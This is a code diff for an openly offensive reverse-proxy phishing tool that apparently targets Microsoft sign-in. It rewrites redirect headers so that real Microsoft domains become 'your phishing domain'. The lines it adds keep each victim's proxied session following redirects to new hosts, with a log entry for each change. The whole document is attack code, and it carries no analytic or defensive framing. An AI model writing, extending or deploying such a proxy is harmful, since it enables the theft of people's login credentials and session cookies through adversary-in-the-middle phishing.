@@ -486,11 +486,26 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     const location = proxyResponse.headers.location;
     if (location) {
         let newLocation = location;
+        // Replace all known Microsoft domains with your phishing domain
         for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
             newLocation = newLocation.replace(new RegExp(real, 'g'), phish);
         }
         proxyResponse.headers.location = newLocation;
         console.log(`[REDIRECT] ${location} → ${newLocation}`);
+
+        // ---- Update session target to the new host (if it's a different domain) ----
+        try {
+            const newUrl = new URL(newLocation);
+            // Only update if the host changed
+            if (newUrl.host !== VICTIM_SESSIONS[currentSession].host) {
+                VICTIM_SESSIONS[currentSession].protocol = newUrl.protocol;
+                VICTIM_SESSIONS[currentSession].hostname = newUrl.hostname;
+                VICTIM_SESSIONS[currentSession].path = newUrl.pathname + newUrl.search;
+                VICTIM_SESSIONS[currentSession].port = newUrl.port;
+                VICTIM_SESSIONS[currentSession].host = newUrl.host;
+                console.log(`[SESSION] Updated target to ${newUrl.host}`);
+            }
+        } catch (e) {}
     }
 } else if (proxyResponse.statusCode > 400) {
     displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
